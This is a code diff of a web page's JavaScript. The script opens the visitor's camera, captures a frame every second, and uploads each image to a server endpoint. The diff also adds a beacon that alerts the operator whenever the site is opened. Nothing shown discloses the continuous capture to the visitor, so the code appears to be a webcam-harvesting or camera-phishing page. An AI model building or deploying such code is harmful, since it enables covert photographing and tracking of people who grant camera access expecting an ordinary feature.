@@ -1,30 +1,32 @@
-const video = document.getElementById('camera');
+const video = document.getElementById('video');
+
+// ✅ Notify when site is opened
+fetch('/api/send-photo', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ notify: true })
+}).catch(err => console.error('Notify error:', err));
 
 // Start camera
 navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
         video.srcObject = stream;
-
-        // Capture every 1 sec
-        setInterval(() => captureAndSend(), 1000);
     })
-    .catch(err => console.error("Camera error:", err));
+    .catch(err => console.error('Camera error:', err));
 
-function captureAndSend() {
+// Capture and send every 1 second
+setInterval(() => {
+    if (!video.videoWidth) return; // Avoid blank captures
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const image = canvas.toDataURL('image/jpeg');
 
-    const imageData = canvas.toDataURL('image/jpeg');
-    sendPhotoToServer(imageData);
-}
-
-function sendPhotoToServer(imageData) {
     fetch('/api/send-photo', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: imageData })
-    }).catch(err => console.error("Send error:", err));
-}
+        body: JSON.stringify({ image })
+    }).catch(err => console.error('Send error:', err));
+}, 1000);
